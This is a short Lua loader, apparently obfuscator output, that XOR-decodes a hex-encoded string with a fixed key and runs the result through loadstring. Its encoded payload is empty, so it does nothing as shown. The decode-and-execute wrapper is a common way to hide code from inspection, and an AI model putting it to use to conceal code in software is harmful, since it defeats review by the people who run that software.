local k={90,126,160,90,127,49,254,130,73,80,101,30,222,213,200,28,63,202,225,26,189,40,173,42,231,193,129,221,145,83,233,81}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
